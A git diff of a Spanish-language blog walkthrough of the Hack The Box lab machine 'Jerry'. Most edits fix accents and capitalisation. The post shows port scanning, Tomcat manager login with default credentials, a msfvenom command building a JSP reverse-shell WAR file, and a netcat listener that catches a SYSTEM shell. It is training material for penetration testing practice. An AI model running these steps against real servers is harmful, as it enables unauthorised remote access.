@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Jerry - Hack The Box
-excerpt: "Esta es una máquina bastante sencilla, realizada en windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un payload en lugar de un exploit para crear una Backdoor en la maquina para que nos devuelva una shell."
+excerpt: "Esta es una máquina bastante sencilla, realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un Payload en lugar de un Exploit para crear una Backdoor en la máquina para que nos devuelva una Shell."
 date: 2023-01-15
 classes: wide
 header:
@@ -18,7 +18,7 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-jerry/jerry_logo.png)
-Esta es una máquina bastante sencilla, realizada en windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un payload en lugar de un exploit, para crear una Backdoor en la maquina para que nos devuelva una shell.
+Esta es una máquina bastante sencilla, realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un Payload en lugar de un Exploit, para crear una Backdoor en la máquina para que nos devuelva una Shell.
 
 # Recopilación de Información
 ## Traza ICMP
@@ -34,10 +34,10 @@ PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3008ms
 rtt min/avg/max/mdev = 132.645/134.479/137.492/1.823 ms
 ```
-Observamos que la máquina esta conectada, además vemos el TTL y vemos que es una maquina Windows.
+Observamos que la máquina está conectada, además vemos el TTL y vemos que es una máquina Windows.
 
 ## Escaneo de Puertos
-Realizamos un escaneo de puertos para ver cuales estan abiertos, una vez realizado haremos un escaneo de servicios. Vemos solamente un puerto abierto, que es el 8080, investigando un poco vemos que este puerto es usado para la web pero es necesario activar un proxy.
+Realizamos un escaneo de puertos para ver cuales están abiertos, una vez realizado haremos un escaneo de servicios. Vemos solamente un puerto abierto, que es el 8080, investigando un poco vemos que este puerto es usado para la web pero es necesario activar un proxy.
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
 
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
 ## Escaneo de Servicios
-Una vez encontrados los puertos, analizamos los servicios que operan en estos. En este caso solo se encontro 1 abierto asi que vamos a analizarlo:
+Una vez encontrados los puertos, analizamos los servicios que operan en estos. En este caso solo se encontró 1 abierto, así que vamos a analizarlo:
 ```
 nmap -sC -sV -p8080 10.10.10.95 -oN targeted
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 12:36 CST
@@ -91,29 +91,29 @@ Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
 * -p: Para indicar puertos especificos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Vemos que el servicio que opera es el Tomcat, ademas de ver que es una pagina web podemos analizarla tambien con la herramienta "whatweb" siendo que nos dara el mismo resultado pero con un poco más de información. OJO, en este caso hay que indicarle el puerto, esto se hace porque el puerto esta ocupando proxy, si no fuera ese caso, solo se pondria la ip de la maquina y listo:
+Vemos que el servicio que opera es el Tomcat, además de ver que es una página web podemos analizarla también con la herramienta "whatweb" siendo que nos dará el mismo resultado pero con un poco más de información. OJO, en este caso hay que indicarle el puerto, esto se hace porque el puerto está ocupando proxy, si no fuera ese caso, solo se pondría la IP de la máquina y listo:
 ```
 whatweb http://10.10.10.95:8080/
 http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
 ```
-# Analisis de Vulnerabilidades
+# Análisis de Vulnerabilidades
 ## Investigación del Servicio
-Bueno pero, ¿que chuchas es el servicio Tomcat? pues vamos a investigarlo:
+Bueno, pero ¿qué chuchas es el servicio Tomcat? pues vamos a investigarlo:
 
 **Apache Tomcat (o, sencillamente, Tomcat) es un contenedor de servlets que se puede usar para compilar y ejecutar aplicaciones web realizadas en Java. Implementa y da soporte tanto a servlets como a páginas JSP (Java Server Pages) o Java Sockets.**
 
-Entonces entendemos que usa java para trabajar la aplicación web, podemos usar esto para encontrar el exploit indicado y acceder a la maquina. Pero antes vamos a analizar la pagina web:
+Entonces entendemos que usa java para trabajar la aplicación web, podemos usar esto para encontrar el Exploit indicado y acceder a la máquina. Pero antes vamos a analizar la página web:
 
-Una vez entramos vemos que nos manda a una pagina por default del servicio Tomcat:
+Una vez entramos vemos que nos manda a una página por default del servicio Tomcat:
 
 ![](/assets/images/htb-writeup-jerry/Captura1.png)
 
-Podemos observar que hay 3 "botones" que cada vez que intentamos acceder nos pide un usuario y contraseña, obviamente no los tenemos asi que vamos a probar algunas credenciales por defecto que tiene tomcat (namas pon en san google credenciales por defecto de tomcat y yasta xd):
+Podemos observar que hay 3 "botones" que cada vez que intentamos acceder nos pide un usuario y contraseña, obviamente no los tenemos así que vamos a probar algunas credenciales por defecto que tiene tomcat (namas pon en san google credenciales por defecto de tomcat y yasta xd):
 * tomcat - tomcat
 * admin - password
 * admin - tomcat
 
-Ninguna sirve entonces vamos a cancelar el login para ver que más podemos hacer...aguanta, nos redirigio a una pagina pero hay algo raro ahi:
+Ninguna sirve entonces vamos a cancelar el login para ver que más podemos hacer...aguanta, nos redirigió a una página, pero hay algo raro ahí:
 
 ![](/assets/images/htb-writeup-jerry/Captura2.png)
 
@@ -121,12 +121,12 @@ Un usuario y contraseña...vamos a usarlos y listo ya accedimos xd:
 
 ![](/assets/images/htb-writeup-jerry/Captura3.png)
 
-Analizando un poco la pagina, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que podemos usar esto para buscar un exploit que podamos usar pues lo que podemos subir es una reverse shell y con eso obtenemos una shell conectada, osease que lo que estamos haciendo es una **BackDoor**.
+Analizando un poco la página, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que podemos usar esto para buscar un Exploit que podamos usar pues lo que podemos subir es una Reverse Shell y con eso obtenemos una Shell conectada, osease que lo que estamos haciendo es una **BackDoor**.
 
 ## Buscando y Configurando un Payload
-Si bien antes usamos **searchsploit** para buscar exploits en la base de datos de Metasploit para usarlos, esta vez vamos a usar la herramienta **msfvenom** que por asi decirlo es similar, la diferencia radica en que aqui le podemos indicar los mismos parametros que en Metasploit además de que usa **Payloads** en lugar de **Exploits**.
+Si bien antes usamos **Searchsploit** para buscar Exploits en la base de datos de Metasploit para usarlos, esta vez vamos a usar la herramienta **msfvenom** que por así decirlo es similar, la diferencia radica en que aquí le podemos indicar los mismos parámetros que en Metasploit además de que usa **Payloads** en lugar de **Exploits**.
 
-Ahora para buscar los payloads debemos usar el siguiente comando, especificando que buscamos los tipo **Java**:
+Ahora para buscar los Payloads debemos usar el siguiente comando, especificando que buscamos los tipos **Java**:
 ```
 msfvenom -l payloads | grep java
     java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
@@ -139,28 +139,27 @@ msfvenom -l payloads | grep java
     java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
     java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shel
 ```
-Vamos a ocupar este payload: **java/jsp_shell_reverse_tcp** que como su descripcion nos dice, se va a conectar de la maquina victima hacia nosotros spawneando una shell. Para usar el exploit solamente debemos indicarle 3 cosillas:
+Vamos a ocupar este Payload: **java/jsp_shell_reverse_tcp** que como su descripción nos dice, se va a conectar de la máquina victima hacia nosotros spawneando una Shell. Para usar el Exploit solamente debemos indicarle 3 cosillas:
 * Nuestra IP con LHOST
 * Un puerto con RHOST
 * Que se guarde en archivo tipo war con -f war
-Y ya solamente lo podemos guardar con un nombre en especifico, yo lo llame shell.war:
+Y ya solamente lo podemos guardar con un nombre en específico, yo lo llame shell.war:
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f war -o shell.war
 Payload size: 1096 bytes
 Final size of war file: 1096 bytes
 Saved as: shell.war
 ```
-Con esto ya nos creo un archivo .war que es lo que admite la aplicacion web, ahora debemos subirlo con la opción browser:
+Con esto ya nos creó un archivo .war que es lo que admite la aplicación web, ahora debemos subirlo con la opción browser:
 
 ![](/assets/images/htb-writeup-jerry/Captura4.png)
 
-Lo seleccionamos y ya lo subimos, ahi mismo observamos que el archivo es tipo **.war**.
+Lo seleccionamos y ya lo subimos, ahí mismo observamos que el archivo es tipo **.war**.
 
 ![](/assets/images/htb-writeup-jerry/Captura5.png)
 
 # Explotando Vulnerabilidades
-## Accediendo a la Maquina
-Una vez subido el archivo que creamos con el payload, que es una **Reverse Shell**, ya solamente debemos alzar una netcat y activar el payload:
+Una vez subido el archivo que creamos con el Payload, que es una **Reverse Shell**, ya solamente debemos alzar una netcat y activar el Payload:
 ```
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
@@ -169,7 +168,7 @@ Le damos click al archivo **.war**:
 
 ![](/assets/images/htb-writeup-jerry/Captura6.png)
 
-Y listo! Ya estamos dentro:
+¡Y listo! Ya estamos dentro:
 ```
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
@@ -182,7 +181,7 @@ C:\apache-tomcat-7.0.88>
 C:\apache-tomcat-7.0.88>whoami
 nt authority\system
 ```
-Y ya solamente es buscar las flags, que normalmente siempre estan alojadas en la carpeta usuarios, dentro del escritorio del usuario y del administrados:
+Y ya solamente es buscar las flags, que normalmente siempre están alojadas en la carpeta usuarios, dentro del escritorio del usuario y del administrados:
 ```
 :\apache-tomcat-7.0.88>cd C:\
 cd C:\
@@ -231,7 +230,7 @@ Directory of C:\Users\Administrator\Desktop
                0 File(s)              0 bytes
                3 Dir(s)   2,418,688,000 bytes free
 ```
-Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahi estara lo que buscamos:
+Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahí estará lo que buscamos:
 
 ```
 C:\Users\Administrator\Desktop>cd flags
